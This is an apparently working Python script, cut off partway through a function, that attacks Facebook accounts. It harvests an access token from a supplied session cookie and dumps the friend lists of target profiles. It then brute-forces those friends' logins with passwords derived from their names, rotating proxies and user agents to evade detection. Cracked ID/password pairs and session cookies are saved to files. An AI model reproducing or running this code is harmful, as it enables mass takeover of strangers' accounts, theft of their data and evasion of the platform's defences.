#!/usr/bin/python3

# -*- coding: utf-8 -*-



import requests,bs4,json,os,sys,random,datetime,time,re

import urllib3

try:

	import rich

except ImportError:

	os.system('pip install rich')

	time.sleep(1)

	try:

		import rich

	except ImportError:

		exit('Cannot Install Rich Module, Try Manual Install (pip install rich)')

from rich.table import Table as me

from rich.console import Console as sol

from bs4 import BeautifulSoup as sop

from concurrent.futures import ThreadPoolExecutor as tred

from rich.console import Group as gp

from rich.panel import Panel as nel

import base64

exec(base64.b64decode(b'ZnJvbSByaWNoIGltcG9ydCBwcmludCBhcyBjZXRhaw=='))

from rich.markdown import Markdown as mark

from rich.columns import Columns as col

from rich import print as rprint

from rich import pretty

from rich.text import Text as tekz

pretty.install()

CON=sol()

# UA LIST

ugen2=[]

ugen=[]

cokbrut=[]

ses=requests.Session()

princp=[]



try:

	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text

	open('.prox.txt','w').write(prox)

except Exception as e:

	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')

prox=open('.prox.txt','r').read().splitlines()

#os.system('rm -rf .prox.txt')



for xd in range(10000):

	a='Mozilla/5.0 (Symbian/3; Series60/'

	b=random.randrange(1, 9)

	c=random.randrange(1, 9)

	d='Nokia'

	e=random.randrange(100, 9999)

	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'

	g=random.randrange(1, 9)

	h=random.randrange(1, 4)

	i=random.randrange(1, 4)

	j=random.randrange(1, 4)

	k='Mobile Safari/535.1'

	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')

	ugen2.append(uaku)





	aa='Mozilla/5.0 (Linux; U; Android'

	b=random.choice(['6','7','8','9','10','11','12'])

	c=' en-us; GT-'

	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	e=random.randrange(1, 999)

	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

	h=random.randrange(73,100)

	i='0'

	j=random.randrange(4200,4900)

	k=random.randrange(40,150)

	l='Mobile Safari/537.36'

	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

	ugen.append(uaku2)



for x in range(10):

	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'

	b=random.randrange(100, 9999)

	c=random.randrange(100, 9999)

	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	h=random.randrange(1, 9)

	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'

	j=random.randrange(1, 9)

	k=random.randrange(1, 9)

	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'

	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

#	ugen.append(uak)



def uaku():

	try:

		ua=open('bbnew.txt','r').read().splitlines()

		for ub in ua:

			ugen.append(ub)

	except:

		a=requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text

		ua=open('.bbnew.txt','w')

		aa=re.findall('line">(.*?)<',str(a))

		for un in aa:

			ua.write(un+'\n')

		ua=open('.bbnew.txt','r').read().splitlines()



# INDICATION

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]

cokbrut=[]

pwpluss,pwnya=[],[]



def cocok():

	try:

		cokbru=open('.cookie.txt').read()

		cokbrut.append(cokbru)

	except:

		login_lagi334()

# COLORS

P = '\033[0;91m' 

M = '\033[0;91m' 

H = '\033[0;91m' 

K = '\033[0;91m' 

B = '\033[2;31;43m'

U = '\033[2;31;43m'

O = '\033[2;31;43m'

N = '\033[0;91m'     

Z = "\033[1;30m"

x = "\x1b[0;90m" # DEFAULT

m = '\033[0;91m'  #RED +

k = '\033[0;91m'  # KUNING +

h = '\033[32m' # HIJAU +

hh = '\033[32m' # HIJAU -

u = '\033[95m' # UNGU

kk = '\033[33m' # KUNING -

b = '\033[2;31;43m' # BIRU -

p = '\033[2;31;43m' # BIRU +

# Converter Bulan

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}

dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}

tgl = datetime.datetime.now().day

bln = dic[(str(datetime.datetime.now().month))]

thn = datetime.datetime.now().year

okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

# CLEAR

def clear():

	os.system('clear')

# BACK

def back():

	login()

#BANNER

def banner():

	clear()

	print("""%s

 < SERAJ ABDRHMAN >
 -------
    \
     \
                                   
                         SERAJO




╔══════════════════════════════════════════╗

║ Creator  : سيرجو 
║تم تعديلها بواسطه سراج

║ Facebook : https://www.facebook.com/noel.m.pena

║ Version  : 0.1                      

║ FILENAME : SER1                     

╚══════════════════════════════════════════╝



"""%(P))



def linex():

	print("%s══════════════════════════════════════════════════════════════════════%s\n"%(P,P))

os.system("clear")

banner()

def chk():

  uuid = str(os.geteuid()) + str(os.getlogin()) 

  id = "|".join(uuid)

  print("\n\n\x1b[37;1m  YOUR ID : \033[94m"+id) 

  try: 

    httpCaht = requests.get("https://pastebin.com/XD0KJicW").text 

    if id in httpCaht: 

      print("\033[92m  ﻞﻌﻔﻣ ﻱﺩ ﻱﻷﺍ. .......\033[97m") 

      msg = str(os.geteuid()) 

      time.sleep(1) 

      pass 

    else: 

      print("\033[0;96m   الاي دي غير مفعل راسلني تيليغرام  \033[0;91m#ﻲﻧﺎﺠﻣ ﺲﻴﻟ!!!") 

      os.system('xdg-open  https://t.me/Q_7_D*')

      time.sleep(1) 

      sys.exit() 

  except: 

    sys.exit() 

    if name == '__main__': 

     print (logo)

     chk() 

     

chk() 

def login():

	try:

		token = open('.token.txt','r').read()

		cok= open('.cok.txt','r').read()

		tokenku.append(token)

		try:

			sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0], cookies = {"cookie":cok})

			sy2 = json.loads(sy.text)['name']

			sy3 = json.loads(sy.text)['id']

			menu(sy2,sy3)

		except KeyError:

			login_lagi334()

		except requests.exceptions.ConnectionError:

			banner()

			print(' %s# BAD INTERNET CONNECTION ! '%(M))

			exit()

	except IOError:

		login_lagi334()



# LOGIN

def login_lagi334():

	banner()

	try:

		cookie=input("%s [●] ADD COOKIES %s"%(P,P))

		linex()

		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 

		find_token = re.search("(EAAG\w+)", data.text)

		ken=open(".token.txt", "w").write(find_token.group(1))

		cok=open(".cok.txt", "w").write(cookie)

		print('ﺡﺎﺠﻨﺑ ﻝﻮﺧﺪﻟﺍ ﻞﻴﺠﺴﺗ ﻢﺗ');time.sleep(1)

		print("\n Jihad 2022")

		os.system('xdg-open https://t.me/Q_7_D')

		exit()

	except Exception as e:

		os.system("rm -f .cok.txt")

		print('%s# COOKIES TEMPORARY EXPIRED '%(M))

		exit()

		





def menu(my_name,my_id):

	try:sh = requests.get('https://httpbin.org/ip').json()

	except:sh = {'origin':'-'}

	banner()

	linex()

	print('%s[%s●%s] %sﻝﺎﺼــﺗﻻﺍ ﻢﺗ'%(P,P,P,P));time.sleep(0.02)

	print('%s[●] IP  %s'%(P,str(sh['origin'])))

	print('%s[●] ID  %s'%(P,my_id))

	linex()

	print('%s[%s01%s] %sﺪﺣﺍﻭ ﺏﺎﺴﺣ ﻕﺍﺮﺘﺧﺍ ﻦﻴﻤﺨﺗ'%(P,P,P,P));time.sleep(0.02)

	print('%s[%s02%s] %sﺏﺎﺴﺣ ﻦﻣ ﺮﺜﻛﺍ ﻦﻴﻤﺨﺗ %sCRACK'%(P,P,P,P,P));time.sleep(0.02)

	print('%s[%s03%s] %sJOIN MY TELEGRAM CHANNEL%s'%(P,P,P,P,P));time.sleep(0.02)

	print('%s[%s04%s] %sSUBSCRIBED ON MY YOUTUBE%s'%(P,P,P,P,P));time.sleep(0.02)

	print('%s[%s06%s] %sEXIT%s'%(P,P,P,M,N));time.sleep(1)

	jh = input(P+'['+P+'●'+P+']  MENU  ')

	if jh in ['1','01']:

		dump_publik()

	elif jh in ['2','02']:

		multidump()

	elif jh in ['3','03']:

		subprocess.check_output(["am", "start", "https://t.me/Q_7_D"])

	elif jh in ['4','04']:

		subprocess.check_output(["am", "start", "https://t.me/Q_7_D"])

	elif jh in ['6','06']:

		os.system("rm -f .cok.txt")

		print(h+'  ['+h+'●'+h+']  HOLD●●●')

		time.sleep(1)

		print('# EXIT SUCCESSFULLY')

		exit()

	else:

		print('# RETURN BACK TO MENU')

		exit()

	  

# PUBLIC CRACK

def dump_publik():

	try:

		cok= open('.cok.txt','r').read()

	except IOError:

		exit()

	linex()

	print(P+'['+P+'●'+P+'] IDS LIST')

	pil = input(P+'['+P+'●'+P+'] ﺔﻴﺤﻀﻟﺍ ﻱﺩ ﻱﺍ ﻖﺼﻟﺍ ● ')

	try:

		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {"cookie":cok}).json()

		for pi in koh2['friends']['data']:

			try:id.append(pi['id']+'|'+pi['name'])

			except:continue

		print(P+'['+P+'●'+P+'] TOTAL: '+str(len(id)))

		setting()

	except requests.exceptions.ConnectionError:

		print('# BAD INTERNET CONNECTION')

		exit()

	except (KeyError,IOError):

		print('# WRONG ID NUMBER')

		exit()



def multidump():

	try:

		cok= open('.cok.txt','r').read()

	except IOError:

		exit()

	try:

		linex()

		nanya_keun = int(input('%s[%s●%s] ﺕﺎﺑﺎﺴﺤﻟﺍ ﺩﺪﻋ %s:%s '%(P,P,P,P,P)))

	except:nanya_keun=100000000

	for mnh in range(nanya_keun):

		mnh +=1

		print()

		pil = input('[%s●%s] ﺏﺎﺴﺤﻟﺍ ﻱﺩ ﻱﺍ ﻖﺼﻟﺍ %s%s%s : '%(P,P,P,mnh,P))

		try:

			koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {"cookie":cok}).json()

			for pi in koh2['friends']['data']:

				try:id.append(pi['id']+'|'+pi['name'])

				except:continue

		except requests.exceptions.ConnectionError:

			print('[×] BAD INTERNET CONNECTION! ')

		except (KeyError,IOError):

			print('\n [×] ERROR RETRIEVING ID, PROBABLY ID IS NOT FOUND');multidump()

	print()

	print(P+'['+P+'•'+P+'] ﺔﻴﺤﻀﻟﺍ ﺀﺎﻗﺪﺻﺍ ﺩﺪﻋ : '+str(len(id)))

	setting()





# PENGATURAN ID

def setting():

	wl = '# ID SEQUENCE SETTINGS'

	sol().print(mark(wl, style='green'))

	teks = '[01] CRACK FROM THE OLDEST ACCOUNT\n[02] CRACK FROM THE YOUNGEST ACCOUNT\n[03] ﺀﺎﻗﺪﺻﻻﺍ ﺕﺎﺑﺎﺴﺣ ﻕﺍﺮﺘﺧﺍ'

	tak = nel(teks, style='cyan')

	cetak(nel(tak, title=' • SETTING • '))

	hu = input(x+'['+p+'f'+x+'] Choose : ')

	if hu in ['1','01']:

		for tua in sorted(id):

			id2.append(tua)



	elif hu in ['2','02']:

		muda=[]

		for bacot in sorted(id):

			muda.append(bacot)

		bcm=len(muda)

		bcmi=(bcm-1)

		for xmud in range(bcm):

			id2.append(muda[bcmi])

			bcmi -=1

	elif hu in ['3','03']:

		for bacot in id:

			xx = random.randint(0,len(id2))

			id2.insert(xx,bacot)

	else:

		ric = '# OPTION NOT IN THE MENU'

		sol().print(mark(ric, style='red'))

		exit()

	met = '# CHOOSE CRACK METHOD'

	sol().print(mark(met, style='green'))

	ioz = '[01]M-PRO\n[02]B-PRO'

	gess = nel(ioz, style='cyan')

	cetak(nel(gess, title=' • METHOD • '))

	hc = input(x+'['+p+'f'+x+']  : ')

	if hc in ['1','01']:

		method.append('mobile')

	elif hc in ['4','04']:

		method.append('mbasic')

	else:

		method.append('mobile')

		

	guw = '# WANT TO USE ADDITIONAL PASSWORD ? (y/t)'

	sol().print(mark(guw, style='cyan'))

	pwplus=input(x+'['+p+'f'+x+'] Choose : ')

	if pwplus in ['y','Y']:

		pwpluss.append('ya')

		krek = '[•] USE COMMA AS SEPARATE\n[•] USE LOWER LETTERS\n[•] EXAMPLE: indonesia,germany,bangladesh'

		cetak(nel(krek, title=' • ADDITIONAL PASSWORD • '))

		pwku=input('ENTER ADDITIONAL PASSWORD : ')

		pwkuh=pwku.split(',')

		for xpw in pwkuh:

			pwnya.append(xpw)

	else:

		pwpluss.append('no')

	passwrd()



# WORDLIST

def passwrd():

	ler = '# ﺭﺎﻈﺘﻧﻷﺍ ﺀﺎﺟﺮﻟﺍ ﻕﺍﺮﺘﺧﻻﺍ ﺔﻴﻠﻤﻋ ﺕﺀﺍﺪﺑ, PRESS CTRL+Z TO STOP'

	sol().print(mark(ler, style='green'))

	krek = '[•] OK RESULTS SAVED IN : INTERNAL MEMORY/4MBF-DATA/OK/%s\n[•] CP RESULTS SAVED IN : INTERNAL MEMORY/4MBF-DATA/CP/%s\nON OF AIRPLANE MODE EVERY 500 ID'%(okc,cpc)

	cetak(nel(krek, title=' • CRACK • '))

	with tred(max_workers=30) as pool:

		for yuzong in id2:

			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()

			frs = nmf.split(' ')[0]

			pwv = ['1122334455','1234554321','112233445566','123456654321']

			if len(nmf)<6:

				if len(frs)<3:

					pass

				else:

					pwv.append(frs+'123')

					pwv.append(frs+'123456')

					pwv.append(frs+'12345')

			else:

				if len(frs)<3:

					pwv.append(nmf)

				else:

					pwv.append(nmf)

					pwv.append(frs+'123')

					pwv.append(frs+'123456')

					pwv.append(frs+'12345')

			if 'ya' in pwpluss:

				for xpwd in pwnya:

					pwv.append(xpwd)

			else:pass

			if 'mobile' in method:

				pool.submit(crack,idf,pwv)

			elif 'free' in method:

				pool.submit(crackfree,idf,pwv)

			elif 'touch' in method:

				pool.submit(cracktouch,idf,pwv)

			elif 'mbasic' in method:

				pool.submit(crackmbasic,idf,pwv)

			else:

				pool.submit(crackmbasic,idf,pwv)

	print('')

	tanya = '# WANT TO SHOW CHECKPOINT OPTIONS ? (y/t)'

	sol().print(mark(tanya, style='green'))

	woi = input(x+'[•] Choose : ')

	if woi in ['y','Y']:

		cek_opsi()

	else:

		exit()



# CRACKER

def crack(idf,pwv):

	global loop,ok

	sys.stdout.write(f"\r [●] {P}[{P}{loop}{P}/{P}{len(id)}{P}] {P}[{H}{ok}{P}] {P}[{M}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),

	sys.stdout.flush()

	ua = random.choice(ugen)

	ua2 = random.choice(ugen2)

	ses = requests.Session()

	for pw in pwv:

		try:

			nip=random.choice(prox)

			proxs= {'http': 'socks4://'+nip}

			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})

			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')

			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}

			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])

			koki+=' m_pixel_ratio=2.625; wd=412x756'

			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}

			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)

			if "checkpoint" in po.cookies.get_dict().keys():

				#print(f'\r {K}[CP] {idf} | {pw}{N}')     

				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

				akun.append(idf+'|'+pw)

				cp+=1

				break

			elif "c_user" in ses.cookies.get_dict().keys():

				ok+=1

				coki=po.cookies.get_dict()

				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

				print(f'\r{H}[OK] {idf} | {pw}{N}')

				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')

				break

				

			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(61)

	loop+=1



#MBASIC#

def crackmbasic(idf,pwv):

	global loop,ok,cp

	bi = random.choice([b,h,hh])

	pers = loop*100/len(id2)

	fff = '%'

	nip=random.choice(prox)

	proxs= {'http': 'socks5://'+nip}

	ua = random.choice(ugen)

	ua2 = random.choice(ugen2)

	ses = requests.Session()

	sys.stdout.write('\r%s  %s/%s  OK:%s CP:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()

	for pw in pwv:

		try:

			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})

			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')

			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}

			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])

			koki+=' m_pixel_ratio=2.625; wd=412x756'

			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}

			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)

			if "checkpoint" in po.cookies.get_dict().keys():

				#print(f'\r {K}[CP] {idf} | {pw}{N}')     

				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

				akun.append(idf+'|'+pw)

				cp+=1

				break

			elif "c_user" in ses.cookies.get_dict().keys():

				ok+=1

				coki=po.cookies.get_dict()

				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

				print(f'\r{H}OK🤣 {idf} | {pw}|{kuki}{N}')

				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')

				break

				

			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(61)

	loop+=1



# OPSI

def ceker(idf,pw):

	global cp

	ua = 'Mozilla/5.0 (Linux; Android 9; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36'

	head = {"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

	ses = requests.Session()

	try:

		hi = ses.get('https://m.facebook.com')

		ho = sop(ses.post('https://m.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')

		jo = ho.find('form')

		data = {}

		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']

		for anj in jo('input'):

			if anj.get('name') in lion:

				data.update({anj.get('name'):anj.get('value')})

		kent = sop(ses.post('https://m.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')

		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))

		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

		cp+=1

		opsi = kent.find_all('option')

		if len(opsi)==0:

			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/M%s)'%(hh,x))

		else:

			for opsii in opsi:

				print('\r%s---> %s%s'%(kk,opsii.text,x))

	except Exception as c:

		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))

		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/M)%s'%(u,x))

		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

		cp+=1



# OPSI CEKER

def cek_opsi():

	c = len(akun)

	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)

	cetak(nel(hu, title='CEK OPSI'))

	input(x+'['+h+'•'+x+'] Mulai')

	cek = '# PROSES CEK OPSI DIMULAI'

	sol().print(mark(cek, style='green'))

	love = 0

	for kes in akun:

		try:

			try:

				id,pw = kes.split('|')[0],kes.split('|')[1]

			except IndexError:

				time.sleep(2)

				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))

				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))

				continue

			bi = random.choice([u,k,kk,b,h,hh])

			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()

			ua = 'Mozilla/5.0 (Linux; Android 10; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36'

			ses = requests.Session()

			header = {"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

			hi = ses.get('https://m.facebook.com')

			ho = sop(ses.post('https://m.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')

			if "checkpoint" in ses.cookies.get_dict().keys():

				try:

					jo = ho.find('form')

					data = {}

